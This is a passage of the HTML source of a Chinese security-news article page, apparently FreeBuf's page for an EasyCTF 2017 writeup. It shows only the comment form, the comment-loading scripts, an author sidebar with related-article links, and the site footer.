		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='131073' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="y2rbyz" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>            </div>
                    <div class="col-md-3 visible-md-block visible-lg-block">
                <div class="panel panel-default">
                    <div class="author-top">
                         <div class="author-wrap">
                            <div class="author-header"><img src="http://image.3001.net/images/20170329/14907409938657.jpg!video" width="0" height="0" alt="精灵" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo" />                            </div>
                            <p class="name"><a href="http://www.freebuf.com/author/%e7%b2%be%e7%81%b5" title="由 精灵 发布" rel="author">精灵</a><span></span></p>
                            <p class="signature">flag:aHR0cDovL3QuY24vUkNyTjRWZA==</p>
                            <p class="art-com clearfix">
                                <span class="aut-article">
                                    <a href="/author/精灵"target="_blank">
                                        <i>3</i>
                                        <i>文章数</i>
                                    </a>
                                </span>
                                <span class="aut-comment">
                                    <a href="/author/精灵?comment=1" target="_blank">
                                        <i>5</i>
                                        <i>评论数</i>
                                    </a>
                                </span>
                            </p>
                        </div>
                    </div>
                    <div class="author-bottom">
                        <div class="author-wrap">
                            <h3 class="last-title">最近文章</h3>
                            <div class="last-item-wrap">
                                                                        <div class="last-item">
                                            <a href="http://www.freebuf.com/articles/rookie/145262.html" target="_blank"><span class="point"></span>内存取证三项CTF赛题详解</a>
                                            <p class="last-time">2017.08.26</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/sectool/132096.html" target="_blank"><span class="point"></span>Webshell密码极速爆破工具 - cheetah</a>
                                            <p class="last-time">2017.04.18</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/articles/others-articles/131073.html" target="_blank"><span class="point"></span>EasyCTF 2017 Writeup</a>
                                            <p class="last-time">2017.04.15</p>
                                        </div>
                                                                </div>
                        </div>

                        <div class="more-wrap">
                            <a href="http://www.freebuf.com/author/精灵" target="_blank" class="btn-new">浏览更多</a>
                        </div>
                    </div>
                </div>
                                <div class="panel panel-default">
                    <div class="read visible-md-block visible-lg-block">
                        <div class="main-tit02">
                            <h3>相关阅读</h3>
                        </div>
                        <ul>
  <li><a href="http://www.freebuf.com/articles/others-articles/131073.html" target="_blank">EasyCTF 2017 Writeup</a></li>
  
  <li><a href="http://www.freebuf.com/articles/web/94444.html" target="_blank">第二届XCTF联赛：ZCTF-writeup</a></li>
  
  <li><a href="http://www.freebuf.com/articles/web/24529.html" target="_blank">XSS挑战第一期Writeup</a></li>
  </ul><ul>
  <li><a href="http://www.freebuf.com/articles/others-articles/6084.html" target="_blank" title=Novell ConsoleOne Hack Evolution>Novell ConsoleOne Hack Evolution</a></li>
  
  <li><a href="http://www.freebuf.com/news/59412.html" target="_blank" title=2014年漏洞最多的操作系统：苹果Mac OS X、iOS和Linux>2014年漏洞最多的操作系统：苹果Mac OS X、iOS和Linux</a></li>
  </ul>                    </div>
                </div>
                <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
                <div class="panel panel-default rec-spe">
                    <div class="main-tit03 colour-blue">
                        <h3>特别推荐</h3>
                    </div>
                                                    <div class="rec-img"><a href="http://www.freebuf.com/ad?id=3" target="_blank"><img
                                            src="http://image.3001.net/2017/05/14a10c5c919d154dddbee79e3a944143-220x150.png" width="220"></a></div>
                                                </div>
                <div id="mar-right">
                    <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
                    <div class="panel panel-default code"><img src="http://image.3001.net/images/new/code.jpg" width="192"
                                                               height="192">
                        <p>关注我们 分享每日精选文章</p>
                    </div>
                </div>
            </div>
                </div>
                    <div class="row marvellous visible-lg-block">
                <h3>不容错过</h3>
                <ul>
                                                <li><a href="http://www.freebuf.com/news/125847.html" rel="bookmark"
                                   title="美国陆军公布“Hack the Army”众测结果：修复118个漏洞，奖金超10万美元">美国陆军公布“Hack the Army”众测结果：修复118个漏洞，奖金超10万美元</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/bimeover" title="由 bimeover 发布" rel="author">bimeover</a></span>
                                                                        <span class="time">2017-01-22</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/topnews/50111.html" rel="bookmark"
                                   title="荷兰记者口述：危机四伏的公共WiFi">荷兰记者口述：危机四伏的公共WiFi</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/cindy" title="由 cindy 发布" rel="author">cindy</a></span>
                                                                        <span class="time">2014-11-05</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/video/130957.html" rel="bookmark"
                                   title="【已结束】FreeBuf公开课直播间 |《网络安全法》对白帽子的影响">【已结束】FreeBuf公开课直播间 |《网络安全法》对白帽子的影响</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/supercoco" title="由 supercoco 发布" rel="author">supercoco</a></span>
                                                                        <span class="time">2017-03-31</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/vuls/88271.html" rel="bookmark"
                                   title="LuManager 高危SQL注入0day分析">LuManager 高危SQL注入0day分析</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e9%98%bf%e9%87%8c%e5%ae%89%e5%85%a8" title="由 阿里安全 发布" rel="author">阿里安全</a></span>
                                                                        <span class="time">2015-12-07</span></p>
                            </li>
                                                            </ul>
            </div>
            </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1197577174" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
